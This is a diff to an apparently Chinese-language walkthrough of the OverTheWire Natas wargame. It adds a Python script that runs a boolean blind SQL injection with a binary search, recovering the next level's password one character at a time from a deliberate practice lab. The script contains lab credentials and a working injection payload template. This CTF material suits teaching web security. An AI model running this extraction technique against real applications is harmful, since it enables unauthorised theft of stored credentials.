@@ -311,4 +311,67 @@ print(currentPass)
 
 密码为 `Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb`
 
+附改进版二分方案：
+```python
+import requests
+from requests.auth import HTTPBasicAuth
+import string
+from string import Template
+
+def ret_true(text):
+    return "This user exists." in text
+
+def ret_err(text):
+    return "Error in query." in text
+
+url = "http://natas15.natas.labs.overthewire.org/"
+
+username = "natas15"
+password = "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g"
+
+auth = HTTPBasicAuth(username, password)
+
+# data = {"username": "natas16"}
+
+# response = requests.post(url, data=data, auth=auth)
+
+ALPHABET = string.ascii_letters + string.digits
+# $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+SQL_TEMPLATE = Template(r'natas16" and ASCII(SUBSTRING(password, $start, 1))<=$ord -- ')
+
+def testOrd(start, ord):
+    sql = SQL_TEMPLATE.substitute(start=start, ord=ord)
+    data = {"username": sql}
+    print(f"ord: {ord}\ndata: {data}")
+    response = requests.post(url, data=data, auth=auth)
+
+    if ret_err(response.text):
+        print("ERROR!")
+        exit(1)
+
+    return ret_true(response.text)
+
+def enumChars(currentPass):
+    left, right = 0, 128
+    while left + 1 != right:
+        mid = (left + right) // 2
+        if testOrd(len(currentPass) + 1, mid):
+            right = mid
+        else:
+            left = mid
+
+    if right <= 1:
+        return None
+    return chr(right)
+
+currentPass = ""
+while True:
+    c = enumChars(currentPass)
+    if c is None:
+        break
+    currentPass += c
+    print(f"curPass: {currentPass}")
+print(f"final answer: {currentPass}")
+```
+
 ## Level 17
